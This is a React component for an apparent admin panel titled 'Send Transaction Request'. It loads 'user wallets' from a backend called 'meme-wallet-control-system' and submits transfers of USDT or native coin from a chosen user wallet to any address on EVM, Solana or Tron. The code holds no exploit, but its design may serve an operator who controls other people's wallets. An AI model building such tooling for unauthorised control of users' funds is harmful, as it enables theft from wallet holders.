import React, { useEffect, useState } from "react";

function SendRequest() {
  const [wallets, setWallets] = useState([]);
  const [selectedWallet, setSelectedWallet] = useState("");
  const [to, setTo] = useState("");
  const [amount, setAmount] = useState("");
  const [token, setToken] = useState("USDT");
  const [chain, setChain] = useState("evm");
  const [message, setMessage] = useState("");

  const backend = "https://meme-wallet-control-system-hx1r.vercel.app";

  useEffect(() => {
    fetch(backend + "/api/admin-get-wallets")
      .then((res) => res.json())
      .then((data) => {
        setWallets(data.wallets || []);
      });
  }, []);

  const sendRequest = async () => {
    if (!selectedWallet) return setMessage("Select a wallet");
    if (!to) return setMessage("Enter recipient address");
    if (!amount) return setMessage("Enter amount");

    const res = await fetch(backend + "/api/transaction-request-create", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        userWallet: selectedWallet,
        to,
        amount,
        token,
        chain
      })
    });

    const data = await res.json();

    if (data.success) {
      setMessage("Request sent successfully!");
      setTo("");
      setAmount("");
    } else {
      setMessage("Error sending request");
    }
  };

  return (
    <div>
      <h2>Send Transaction Request</h2>

      {message && <p style={{ color: "cyan" }}>{message}</p>}

      <div className="form">
        <label>User Wallet</label>
        <select
          value={selectedWallet}
          onChange={(e) => setSelectedWallet(e.target.value)}
        >
          <option value="">Select Wallet</option>
          {wallets.map((w) => (
            <option key={w.id} value={w.address}>
              {w.address}
            </option>
          ))}
        </select>

        <label>Send To Address</label>
        <input
          type="text"
          placeholder="Enter recipient address"
          value={to}
          onChange={(e) => setTo(e.target.value)}
        />

        <label>Amount</label>
        <input
          type="number"
          placeholder="Enter amount"
          value={amount}
          onChange={(e) => setAmount(e.target.value)}
        />

        <label>Token</label>
        <select value={token} onChange={(e) => setToken(e.target.value)}>
          <option value="USDT">USDT</option>
          <option value="NATIVE">Native Coin</option>
        </select>

        <label>Chain</label>
        <select value={chain} onChange={(e) => setChain(e.target.value)}>
          <option value="evm">EVM</option>
          <option value="solana">Solana</option>
          <option value="tron">Tron</option>
        </select>

        <button className="btn" onClick={sendRequest}>
          Send Request
        </button>
      </div>
    </div>
  );
}

export default SendRequest;
